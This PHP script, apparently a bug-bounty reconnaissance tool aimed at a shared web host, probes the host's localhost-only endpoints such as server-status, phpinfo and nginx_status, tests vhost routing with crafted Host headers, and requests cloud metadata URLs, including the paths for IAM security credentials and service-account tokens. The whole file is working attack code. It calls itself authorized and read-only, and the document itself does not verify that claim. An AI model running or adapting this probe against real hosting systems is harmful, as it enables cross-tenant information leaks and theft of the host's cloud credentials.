<?php
// Authorized Hostinger HackerOne test. READ-ONLY, benign, non-destructive.
// From tenant PHP (inside the CageFS cage) on a shared web host, probe what the HOST's
// localhost network exposes that external users cannot reach: web-server diagnostic
// endpoints that may aggregate cross-tenant activity, and cloud metadata that would reveal
// the shared host's cloud identity (= affects all tenants). Only GETs; reads nothing of
// other tenants beyond what a localhost-only endpoint itself discloses. No writes.
@header('Content-Type: text/plain');
$TS = getenv('PROBE_TS') ?: date('U');
echo "== bugbounty-$TS localhost internal-reach probe (read-only) ==\n";
echo "host=".gethostname()." uid=".(function_exists('posix_getuid')?posix_getuid():'?')."\n";

function hget($url,$host=null,$extra=array(),$to=4){
    $ch=curl_init($url);
    $h=array('Accept: */*','User-Agent: bugbounty-probe');
    if($host) $h[]="Host: $host";
    foreach($extra as $e) $h[]=$e;
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER=>1, CURLOPT_HEADER=>1, CURLOPT_TIMEOUT=>$to,
        CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_SSL_VERIFYHOST=>0,
        CURLOPT_HTTPHEADER=>$h, CURLOPT_FOLLOWLOCATION=>0));
    $r=curl_exec($ch); $e=curl_error($ch); $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
    return array($code,$e,(string)$r);
}
function oneline($s,$n=200){ return substr(preg_replace('/\s+/',' ',trim($s)),0,$n); }

echo "\n-- identify localhost web server (Server header) --\n";
list($c,$e,$b)=hget('http://127.0.0.1/');
$hdr = substr($b,0,strpos($b."\r\n\r\n","\r\n\r\n"));
echo "GET http://127.0.0.1/ => HTTP $c ".($e?"err=$e":"")."\n".oneline($hdr,300)."\n";

echo "\n-- localhost-only diagnostic endpoints (cross-tenant activity leak?) --\n";
foreach(array('/server-status','/server-status?auto','/server-info','/status','/stub_status',
  '/nginx_status','/whm-server-status','/ls-server-status','/.status','/apc.php','/phpinfo.php') as $p){
    list($c,$e,$b)=hget('http://127.0.0.1'.$p,null,array(),3);
    $body = (strpos($b,"\r\n\r\n")!==false)? substr($b,strpos($b,"\r\n\r\n")+4) : $b;
    echo "127.0.0.1$p => HTTP $c ".($e?"err=$e ":"").oneline($body,140)."\n";
}

echo "\n-- vhost routing: is 127.0.0.1 the SHARED host loopback? --\n";
list($c,$e,$b)=hget('http://127.0.0.1/','grey-jaguar-553866.hostingersite.com');
echo "Host:grey-jaguar(mine) => HTTP $c ".oneline($b,80)."\n";
list($c,$e,$b)=hget('http://127.0.0.1/','no-such-vhost-'.$TS.'.invalid');
echo "Host:bogus => HTTP $c ".oneline($b,80)."\n";
list($c,$e,$b)=hget('http://127.0.0.1/','localhost');
echo "Host:localhost => HTTP $c ".oneline($b,80)."\n";

echo "\n-- cloud metadata from web host (would leak HOST cloud identity = all-tenant) --\n";
foreach(array(
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
  'http://100.100.100.100/latest/meta-data/',
  'http://metadata.google.internal/computeMetadata/v1/') as $u){
    list($c,$e,$b)=hget($u,null,array('Metadata-Flavor: Google','Metadata: true'),3);
    $body = (strpos($b,"\r\n\r\n")!==false)? substr($b,strpos($b,"\r\n\r\n")+4) : $b;
    echo "GET $u => HTTP $c ".($e?"err=$e":oneline($body,120))."\n";
}
echo "\n== done ==\n";
